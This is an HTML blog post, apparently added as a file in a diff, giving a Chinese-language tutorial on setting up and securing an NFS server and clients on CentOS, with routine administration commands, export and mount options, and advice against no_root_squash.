@@ -1,0 +1,383 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<!-- Head tag -->
+<head>
+
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    <!--Description-->
+    
+        <meta name="description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战">
+    
+
+    <!--Author-->
+    
+        <meta name="author" content="klion">
+    
+
+    <!--Open Graph Title-->
+    
+        <meta property="og:title" content="服务安全 [ NFS ]"/>
+    
+
+    <!--Open Graph Description-->
+    
+        <meta property="og:description" content="专注于web和内网攻防研究,安全开发,安全运维,架构安全,热衷于高质量实用干货分享,提供全方位网络安全培训,更多请扫码关注自己博客下方的微信公众号,同时也期待更多志同道合的兄弟能一起并肩作战" />
+    
+
+    <!--Open Graph Site Name-->
+    <meta property="og:site_name" content="klion&#39;s blog"/>
+
+    <!--Type page-->
+    
+        <meta property="og:type" content="article" />
+    
+
+    <!--Page Cover-->
+    
+
+    <meta name="twitter:card" content="summary" />
+    
+
+    <!-- Title -->
+    
+    <title>服务安全 [ NFS ] - klion&#39;s blog</title>
+
+    <!-- Bootstrap Core CSS -->
+    <link rel="stylesheet" href="//maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.2/css/bootstrap.min.css" integrity="sha384-y3tfxAZXuh4HwSYylfB+J125MxIs6mR5FOHamPBG064zB+AFeWH94NdvaCBm8qnd" crossorigin="anonymous">
+
+    <!-- Custom Fonts -->
+    <link href="//maxcdn.bootstrapcdn.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet" type="text/css">
+
+    <!-- HTML5 Shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!-- WARNING: Respond.js doesn't work if you view the page via file:// -->
+    <!--[if lt IE 9]>
+        <script src="//oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="//oss.maxcdn.com/libs/respond.js/1.4.2/respond.min.js"></script>
+    <![endif]-->
+
+    <!-- Gallery -->
+    <link href="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.css" type="text/css" rel="stylesheet" />
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/style.css">
+
+    <!-- Google Analytics -->
+    
+
+
+</head>
+
+
+<body>
+
+<div class="bg-gradient"></div>
+<div class="bg-pattern"></div>
+
+<!-- Menu -->
+<!--Menu Links and Overlay-->
+<div class="menu-bg">
+    <div class="menu-container">
+        <ul>
+            
+            <li class="menu-item">
+                <a href="/">
+                    home
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/archives">
+                    archives
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/about">
+                    about me
+                </a>
+            </li>
+            
+            <li class="menu-item">
+                <a href="/contact">
+                    blogs
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+</div>
+
+<!--Hamburger Icon-->
+<nav>
+    <a href="#menu"></a>
+</nav>
+
+<div class="container">
+
+    <!-- Main Content -->
+    <div class="row">
+    <div class="col-sm-12">
+
+        <!--Title and Logo-->
+        <header>
+    <div class="logo">
+        <a href="/"><i class="logo-icon fa " aria-hidden="true"></i></a>
+        
+    </div>
+</header>
+
+        <section class="main">
+            
+<div class="post">
+
+    <div class="post-header">
+        <h1 class="title">
+            <a href="/2017/07/07/NFS-sec/">
+                服务安全 [ NFS ]
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-07-07</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/env/">env</a>
+                </span>
+            
+        </div>
+    </div>
+
+    <div class="content">
+
+        <!-- Gallery -->
+        
+
+        <!-- Post Content -->
+        <p><br><br>0x01 NFS 简介:<br>&nbsp;&nbsp;&nbsp;&nbsp;NFS 一个比较古老<code>[比自己的年龄都大]</code>的网络文件系统,不过,相对比较稳定,由服务端和客户端组成 [ 即 C/S 架构 ] ,服务端主要负责提供共享目录 [一般为web的用户数据存放目录,专门用来存放用户上传的各类静态数据],而客户端则负责存取该共享目录中的数据</p>
+<p>0x02 NFS 容易产生安全问题的几个点:<br><figure class="highlight clean"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">共享目录在本地文件系统中的权限问题</div><div class="line">NFS服务用户权限设置问题</div><div class="line">NFS客户端挂载的安全及性能问题</div><div class="line">.....</div></pre></td></tr></table></figure></p>
+<p>0x03 环境部署简介 [ 所有系统均以 centOS6.8_x64 最小化安装,只带有必要的环境库 ]:</p>
+<p>nfs服务端:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">NfsServer</span>	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.4</span><span class="selector-class">.2</span></div></pre></td></tr></table></figure></p>
+<a id="more"></a>
+<p>nfs客户端:<br><figure class="highlight css"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="selector-tag">NfsClient5</span> 	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.4</span><span class="selector-class">.4</span>  为<span class="selector-tag">CentOS5</span><span class="selector-class">.5</span> <span class="selector-tag">i386</span></div><div class="line"><span class="selector-tag">NfsClient6</span>	<span class="selector-tag">ip</span>: 192<span class="selector-class">.168</span><span class="selector-class">.4</span><span class="selector-class">.3</span></div></pre></td></tr></table></figure></p>
+<p>0x04 NFS 的一些优缺点:</p>
+<p>优点<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">NFS 较适合中小型集群,典型特点,高效,灵活,稳定,简单,易用</div><div class="line">主要用来存放用户上传的各种静态资源,如,各类视频,图片,office,pdf文件等...,当然啦,比如各类文章数据什么的依然还是会存到数据库中</div><div class="line">这样做的好处就是,文件非常规整,容易集中处理 <span class="string">[如,备份,严格权限控制]</span>……</div><div class="line">言外之意,也就是说在这里是不会存放有任何后台代码文件的</div></pre></td></tr></table></figure></p>
+<p>缺点<br><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">网络状况不是太好的时候,会极大影响传输速度,毕竟不是直接存到本地,而是通过网络存到挂载的远程共享目录中,对网络环境比较依赖</div><div class="line">另外,默认用明文传输,无任何验证</div><div class="line">多客户端挂载连接的问题,服务端一旦无故<span class="meta">down</span>掉,客户端可能会一直处于卡住的状态</div></pre></td></tr></table></figure></p>
+<p>0x05 另外,还有一种 linux 文件共享实现 [基于samba]:<br><figure class="highlight nginx"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="attribute">samba</span> 非常小巧,方便,简单,不过更适合用于小型办公内网实现linux和windows之间文件共享用,它有些类似于win下的文件共享,跟NFS完全不是一类东西</div></pre></td></tr></table></figure></p>
+<p>0x06 NFS 内部工作细节简要分析:<br><figure class="highlight haml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-<span class="ruby">&gt; RPC服务端一定要最先起来,即处于bind状态</span></div><div class="line">  -<span class="ruby">&gt; 然后,再启动NFS服务端,NFS服务端在启动时会自动向RPC服务注册数据传输端口 [ 其实就是告诉rpc服务端等会儿可以从哪些端口来传数据 ]</span></div><div class="line">    -<span class="ruby">&gt; 最后,当NFS客户端通过rpc客户端来连的时候,服务端的rpcbind就会把NFS服务端启动时注册的那些端口,告诉它,然后客户端就可以从指定的端口拿到数据了</span></div><div class="line">      -<span class="ruby">&gt; RPC 客户端工具 rpcbind [centos6.x] / portmap[centos5.x]</span></div></pre></td></tr></table></figure></p>
+<p>0x07 准备开始安装NFS,所需的软件包如下:<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nfs-utils	NFS 服务端的主程序,里面包含一些nfs工具</div><div class="line">rpcbind <span class="string">[centos6.x]</span> / portmap <span class="string">[centos5.x]</span>  RPC 客户端工具</div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> rpm -qa nfs-utils rpcbind</span></div><div class="line"><span class="meta">#</span><span class="bash"> yum install nfs-utils rpcbind -y	  在客户端和服务端机器上都要装 [ 因为showmount工具在软件包中 ],但客户端不需要配置也不用起NFS服务</span></div><div class="line"><span class="meta">#</span><span class="bash"> yum install nfs-utils nfs-utils-lib -y  在centOS5.x 中安装NFS</span></div></pre></td></tr></table></figure>
+<p>0x08 尝试启动 NFS 服务端:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/rpcbind start   	务必要最先起rpc服务,rpcbind默认工作在tcp/udp的111端口</span></div><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/rpcbind status	确认服务是否已经成功启动</span></div><div class="line"><span class="meta">#</span><span class="bash"> lsof -i :111</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -tulnp | grep <span class="string">"111"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> chkconfig --list rpcbind    	     检查是否已经自启动 [ 实际生产环境中不建议用chkconfig实现自启动,可直接把启动命令放到/etc/rc.local文件中 ]</span></div><div class="line"><span class="meta">#</span><span class="bash"> chkconfig --level 2345 rpcbind off 最好不要这样自启动,等会儿把它放在rc.local文件中</span></div><div class="line"><span class="meta">#</span><span class="bash"> rpcinfo -p 127.0.0.1  	     查看端口池</span></div></pre></td></tr></table></figure></p>
+<p><img src="/img/RPCServer start.png" alt=""><br><img src="/img/NfsServer rpcinfo.png" alt=""></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/nfs start  	再来启动nfs服务,默认工作在2049端口,NFS服务启动以后会自动向rpc注册,其实就是告诉rpcbind等会儿从哪些端口来传数据</span></div><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/nfs status	确认服务是否已经成功启动</span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -tulnp | grep 2049</span></div><div class="line"><span class="meta">#</span><span class="bash"> rpcinfo -p 127.0.0.1		再次来检查端口池,就会发现多出来好多2049的端口,说明nfs服务端向rpcbind注册端口成功</span></div></pre></td></tr></table></figure>
+<p><img src="/img/NfsServer start.png" alt=""><br><img src="/img/NfsServer ps tree.png" alt=""></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> chkconfig --list nfs		 检查是否已经自启动 [ 同样,不要用chkconfig自启动,用rc.local文件即可,后续方便管理]</span></div><div class="line"><span class="meta">#</span><span class="bash"> chkconfig --level 2345 nfs off</span></div></pre></td></tr></table></figure>
+<p>额外补充:<br>&nbsp;&nbsp;&nbsp;&nbsp;同样是基于chkconfig管理的服务,怎么确保某个服务先起来某个服务后起来呢,其实很简单,到对应服务脚本中去调整下启动顺序即可<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> vi /etc/init.d/rpcbind</span></div><div class="line"><span class="meta">  #</span><span class="bash"> chkconfig: 2345 13 87</span></div><div class="line"><span class="meta"></span></div><div class="line">#<span class="bash"> vi /etc/init.d/nfs</span></div><div class="line"><span class="meta">  #</span><span class="bash"> chkconfig: - 30 60</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"/etc/init.d/rpcbind start"</span> &gt;&gt; /etc/rc.local   加入开启启动文件</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"/etc/init.d/nfs start"</span> &gt;&gt; /etc/rc.local</span></div><div class="line"><span class="meta">#</span><span class="bash"> cat /etc/rc.local</span></div><div class="line"><span class="meta">#</span><span class="bash"> ps -ef | egrep <span class="string">"nfs|rpc"</span>   	nfsd是NFS的主进程</span></div></pre></td></tr></table></figure>
+<p>0x09 NFS 主要进程作用简要说明:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ps -ef | egrep <span class="string">"rpc|nfs"</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> man rpc.rquotad	直接man进程名即可查看该进程的详细帮助</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">rpc<span class="selector-class">.statd</span>	文件检验进程</div><div class="line">rpc<span class="selector-class">.rquotad</span> 	磁盘配额相关进程</div><div class="line">rpc<span class="selector-class">.mounted</span>	权限管理验证进程</div><div class="line">nfsd		NFS服务主进程</div><div class="line">...</div></pre></td></tr></table></figure>
+<p>0x10 配置 NFS server 端:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> ls -l /etc/exports  NFS主配置文件,默认为空,需要自己手工加参数</span></div></pre></td></tr></table></figure></p>
+<p>0x11 nfs配置文件格式,如下:<br><figure class="highlight markdown"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nfs要共享的目录 可以访问的网段或者机器[<span class="string">可以是机器名[需要事先在hosts中解析</span>],ip[<span class="string">支持单个ip或CIDR格式</span>],同时也支持通配符表示][参数1,参数2,参数3...]</div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> mkdir /data/&#123;file,pic,movie,music,office&#125; -p  首先,创建好要共享的目录,没有实际需求,不要傻到直接把根共享出去</span></div><div class="line"><span class="meta">#</span><span class="bash"> tree /data/</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"192.168.4.4 NfsClient5"</span> &gt;&gt; /etc/hosts</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"192.168.4.3 NfsClient6"</span> &gt;&gt; /etc/hosts</span></div></pre></td></tr></table></figure>
+<p>rw 表示共享目录可读写[实际是映射在nfsnobody系统服务用户上的],sync表示实时同步写到磁盘,另一种书写方式,和上面的意思其实一样的<br><figure class="highlight haskell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta"># vi /etc/exports</span></div><div class="line">  /<span class="class"><span class="keyword">data</span>         192.168.4.*(<span class="title">rw</span>,<span class="title">sync</span>,<span class="title">all_squash</span>)</span></div><div class="line">  /<span class="class"><span class="keyword">data</span>/file	192.168.4.0/24(<span class="title">rw</span>,<span class="title">sync</span>,<span class="title">all_squash</span>)</span></div><div class="line">  /<span class="class"><span class="keyword">data</span>/pic	<span class="type">NfsClient6</span>(<span class="title">rw</span>,<span class="title">sync</span>,<span class="title">all_squash</span>)</span></div><div class="line">  /<span class="class"><span class="keyword">data</span>/movie	<span class="type">NfsClient5</span>(<span class="title">rw</span>,<span class="title">sync</span>,<span class="title">all_squash</span>)</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/nfs reload  或者用  <span class="comment"># exportfs -r  平滑重启nfs,不影响用户</span></span></div><div class="line"><span class="meta">#</span><span class="bash"> netstat -tulnp | egrep <span class="string">"111|2049"</span></span></div></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> showmount -e 127.0.0.1				本机查看共享目录</span></div><div class="line"><span class="meta">#</span><span class="bash"> mkdir /mnt/data/&#123;file,pic,movie,music,office&#125; -p	先在本地创建挂载点目录</span></div><div class="line"><span class="meta">#</span><span class="bash"> touch /mnt/data/&#123;file/file.txt,pic/pic.txt,movie/movie.txt,music/music.txt,office/office.txt&#125; 等会儿用来做挂载后的验证</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount -t nfs 192.168.4.2:/data/file /mnt/data/file	尝试在本地挂载看看能不能成功</span></div><div class="line"><span class="meta">#</span><span class="bash"> df -h					确认是否真的已经挂上了</span></div><div class="line"><span class="meta">#</span><span class="bash"> ll /mnt/data/file			到这一步基本就可以确定挂载就没什么问题了</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"mount -t nfs 192.168.4.2:/data/file /mnt/data/file"</span> &gt;&gt; /etc/rc.local</span></div><div class="line"><span class="meta">#</span><span class="bash"> touch /mnt/data/file/file_client.txt  此时,你会发现,还不能往挂载到的共享目录里写,因为默认的属主是root</span></div></pre></td></tr></table></figure>
+<p><img src="/img/NfsServer mount local.png" alt=""></p>
+<p>0x12 启动并配置 NFS client:</p>
+<p>修改两台nfs客户端机器的本地dns解析,并创建好各自的挂载点目录<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"192.168.4.4 NfsClient5"</span> &gt;&gt; /etc/hosts</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"192.168.4.3 NfsClient6"</span> &gt;&gt; /etc/hosts</span></div><div class="line"><span class="meta">#</span><span class="bash"> mkdir /mnt/data/&#123;file,pic,movie,music,office&#125; -p</span></div></pre></td></tr></table></figure></p>
+<p>在 NfsClient6 上尝试挂载<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> showmount -e 192.168.4.2</span></div><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/rpcbind start</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount -t nfs 192.168.4.2:/data/pic /mnt/data/pic/</span></div><div class="line"><span class="meta">#</span><span class="bash"> df -h	</span></div><div class="line"><span class="meta">#</span><span class="bash"> ll /mnt/data/pic/ 			看下是否能看到共享目录中的文件,能看见则说明挂载成功</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"/etc/init.d/rpcbind start"</span> &gt;&gt; /etc/rc.local</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"mount -t nfs 192.168.4.2:/data/pic /mnt/data/pic/"</span> &gt;&gt; /etc/rc.local</span></div><div class="line"><span class="meta">#</span><span class="bash"> touch /mnt/data/pic/pic_client.txt	此时,你会发现,还不能往挂载到的共享目录里写,因为文件默认的属主是root</span></div></pre></td></tr></table></figure></p>
+<p>在 NfsClient5 上尝试挂载<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> showmount -e 192.168.4.2</span></div><div class="line"><span class="meta">#</span><span class="bash"> /etc/init.d/portmap start</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount -t nfs 192.168.4.2:/data/movie /mnt/data/movie</span></div><div class="line"><span class="meta">#</span><span class="bash"> df -h</span></div><div class="line"><span class="meta">#</span><span class="bash"> ll /mnt/data/movie/ 			看下是否能看到共享目录中的文件,能看见则说明挂载成功</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"/etc/init.d/portmap start"</span> &gt;&gt; /etc/rc.local</span></div><div class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">echo</span> <span class="string">"mount -t nfs 192.168.4.2:/data/movie /mnt/data/movie"</span> &gt;&gt; /etc/rc.local</span></div><div class="line"><span class="meta">#</span><span class="bash"> touch /mnt/data/movie/movie_client.txt 此时,你会发现,还不能往挂载到的共享目录里写,因为文件默认的属主是root</span></div></pre></td></tr></table></figure></p>
+<p>0x13 实现不同用户上传的文件,可以相互读写,NFS的权限操作默认最终都会被映射到nfsnobody这个服务用户上,所以要想读写最简单的办法就是直接改属主<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> cat /var/lib/nfs/etab  		该文件是NFS服务器的所有配置参数,默认情况下,所有用户只要访问nfs的共享目录都会被压缩成nfsnobody用户身份</span></div><div class="line"><span class="meta">#</span><span class="bash"> grep 65534 /etc/passwd</span></div><div class="line"><span class="meta">#</span><span class="bash"> chown -R nfsnobody.nfsnobody /data/	服务器共享目录本地文件系统权限控制,改下属主,再次写就能写进去了</span></div><div class="line"><span class="meta">#</span><span class="bash"> ll /data/</span></div><div class="line"><span class="meta">#</span><span class="bash"> touch /mnt/data/file/file_client.txt	</span></div><div class="line"><span class="meta">#</span><span class="bash"> ll /mnt/data/file			观察下文件目录的属主,属组,全部变成了nfsnobody</span></div></pre></td></tr></table></figure></p>
+<p>0x14 NFS 故障简单排查 [ 最好的方法就是按照正常的流程一步步的仔细检查 ]:<br><figure class="highlight processing"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">/etc/services 不知道为什么变成了二进制文件,在其它机器找个services替换过来就好了</div><div class="line">防火墙拦截,可以先ping下<span class="built_in">nfs</span>服务器,然后再尝试telnet到<span class="built_in">nfs</span>服务器的<span class="number">111</span>端口上看能不能通</div><div class="line">权限不够,把共享目录的属主改成 nfsnobody</div><div class="line">服务端死掉了,但客户端还正处于挂载状态,此时在客户端上执行 df -h 就会处于挂起的状态[因为客户端还在持续的呼叫],这时直接把客户端挂载点umount掉就好了</div></pre></td></tr></table></figure></p>
+<p>0x15 nfs 主要配置参数详解:<br><figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"># cat <span class="regexp">/var/</span>lib<span class="regexp">/nfs/</span>etab</div></pre></td></tr></table></figure></p>
+<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/data/file <span class="number">192.168</span><span class="number">.3</span><span class="number">.0</span>/<span class="number">24</span>(rw,sync,all_squash,root_squash) 实际中的配置标准,一般像这样就可以了,基本不再需要额外参数</div></pre></td></tr></table></figure>
+<figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">rw 	可读写</div><div class="line"><span class="keyword">sync</span> 	同步写入,数据安全,基本不会丢,但效率低</div><div class="line"><span class="keyword">async</span> 	异步写入,数据可能会丢,不过效率高,有一定延迟,短时间可能会出现数据不一致的情况</div></pre></td></tr></table></figure>
+<figure class="highlight applescript"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">no_root_squash 如果访问NFS共享目录的用户是以root身份过来的,那么它对共享目录也有root权限[通常用于无盘工作站],非常危险,大部分NFS安全问题都集中于此</div><div class="line">root_squash    自动把root用户身份压缩成匿名用户</div><div class="line">all_squash     不管共享目录的用户身份如何,只要加此参数,所有客户端访问都统统会自动被压缩成一个匿名用户,来访问,即nfsnobody</div><div class="line">anonuid	       指明匿名用户<span class="built_in">id</span>,在 centos5 下的用户可能不是<span class="number">65534</span>,就需要自己手工指定,在centos6.x中,尽量不要修改服务端共享目录默认的用户身份</div><div class="line">anongid	       指明匿名组<span class="built_in">id</span>,如果你要指明使用特定的uid就必须保证nfs服务器上先得有这么一个用户才行</div></pre></td></tr></table></figure>
+<p>0x16 NFS 相关命令及配置文件:<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> /usr/sbin/exportfsnfs	自带的管理工具</span></div><div class="line"><span class="meta">#</span><span class="bash"> /usr/sbin/showmount	查看server挂载信息</span></div><div class="line"><span class="meta">#</span><span class="bash"> cat /proc/mounts	查看挂载信息</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> cat /var/lib/nfs/etab	 查看NFS服务端挂载参数详细配置</span></div><div class="line"><span class="meta">#</span><span class="bash"> cat /var/lib/nfs/xtab  centos6.x中没有,在centos5.x记录已挂载的信息</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount 		 查看当前机器的所有挂载点,方便后续卸载</span></div><div class="line"><span class="meta">#</span><span class="bash"> cat /proc/mounts</span></div></pre></td></tr></table></figure>
+<p>0x17 客户端挂载优化,实际生产务必用普通用户身份进行挂载 [ 有关挂载选项其实,默认就好了 ]:</p>
+<p>mount -o 常用选项简要说明:<br><figure class="highlight dart"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">rw</div><div class="line"><span class="keyword">sync</span></div><div class="line">defaults</div><div class="line">rw,suid,dev,exec,auto,nouser,<span class="keyword">async</span></div><div class="line">noexec		不允许执行任何可执行程序</div><div class="line">nodiratime 	不改变目录时间戳,减少io,提升磁盘性能</div><div class="line">noatime		不改变文件时间戳,减少和磁盘的交互,提升性能</div><div class="line">nosuid		不允许在此文件系统中做suid</div><div class="line">remount		当文件系统不知道因为什么原因变成了只读,可以使用此选项让文件系统重新可写</div></pre></td></tr></table></figure></p>
+<p>相对安全的挂载,其实,实际生产情况下,默认的性能基本就很好了<br><figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> mount -t nfs -o nosuid,noexec,nodev,rw,noatime,nodiratime,hard,rsize=131072,wsize=131072 192.168.4.2:/data/movie /mnt/data/movie</span></div><div class="line"><span class="meta">#</span><span class="bash"> mount -t nfs 192.168.3.38:/data /mnt/web/file</span></div><div class="line"><span class="meta">#</span><span class="bash"> umount -lf /mnt/web/file 	在不退出挂载点目录的情况下强制卸载挂载点</span></div></pre></td></tr></table></figure></p>
+<p>0x18 nfs 相关内核参数优化 [ 增加吞吐量,调整客户端和服务端之间的读写缓冲区大小,最好在nfs客户端,服务端全部同时加上 ] :<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"># cat &gt;&gt; /etc/sysctl.conf&lt;&lt;<span class="literal">EOF</span></div><div class="line">net.core.wmem_default = <span class="number">8388608</span></div><div class="line">net.core.rmem_default = <span class="number">8388608</span></div><div class="line">net.core.rmem_max = <span class="number">16777216</span></div><div class="line">net.core.wmem_max = <span class="number">16777216</span></div><div class="line"><span class="literal">EOF</span></div></pre></td></tr></table></figure></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#</span><span class="bash"> sysctl -p</span></div></pre></td></tr></table></figure>
+<p>0x19 配置NFS集群推荐的硬件支持:<br><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">硬盘最好sas/ssd,推荐用raid/raid10,网卡吞吐量要大 <span class="string">[ 可做bond功能,其实蛮简单的,就是将多块网卡合并成一块网卡的技巧 ]</span></div></pre></td></tr></table></figure></p>
